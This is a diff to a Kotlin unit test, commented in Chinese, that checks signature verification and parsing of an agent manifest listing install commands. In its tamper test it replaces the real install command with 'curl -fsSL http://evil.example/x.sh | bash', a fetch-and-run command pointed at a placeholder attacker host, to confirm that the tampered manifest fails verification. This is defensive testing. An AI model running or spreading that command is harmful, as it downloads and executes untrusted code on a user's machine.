@@ -31,8 +31,8 @@ class AgentManifestVerifyTest {
         // 锚点从正文里现取 npm install 命令——manifest v5 曾改命令导致写死锚点空转、
         // 正文未被篡改而用例假失败；先断言篡改确实发生，杜绝同类静默空转。
         val body = String(realBody(), Charsets.UTF_8)
-        val anchor = Regex("npm install[^\"]*").find(body)?.value
-            ?: error("manifest 中找不到 npm install 命令，篡改用例锚点需更新")
+        val anchor = Regex("curl -fsSL [^\"]*").find(body)?.value
+            ?: error("manifest 中找不到 curl 安装命令，篡改用例锚点需更新")
         val tampered = body.replace(anchor, "curl -fsSL http://evil.example/x.sh | bash")
         assertTrue("篡改锚点未命中正文，用例空转", tampered != body)
         assertFalse(AgentManifest.verify(tampered.toByteArray(Charsets.UTF_8), realSig()))
@@ -60,10 +60,12 @@ class AgentManifestVerifyTest {
     fun `解析 - 提取全部字段`() {
         val text = String(realBody(), Charsets.UTF_8)
         val entries = AgentManifest.parse(text)
-        assertTrue(entries.size >= 4)
-        val oc = entries.first { it.id == "opencode" }
-        assertTrue(oc.name.contains("OpenCode"))
-        assertTrue(oc.installCmd.contains("opencode-ai"))
-        assertTrue(oc.launchCmd == "opencode")
+        // v1.3 B2：终端 npm 版 opencode 条目已随重签删除（太极 serve 版走 OcManager，
+        // 从来不在 agents 之列）；样例条目换 claude-code
+        assertTrue(entries.size >= 3)
+        val cc = entries.first { it.id == "claude-code" }
+        assertTrue(cc.name.isNotEmpty())
+        assertTrue(cc.installCmd.contains("install.sh"))
+        assertTrue(cc.launchCmd.isNotEmpty())
     }
 }
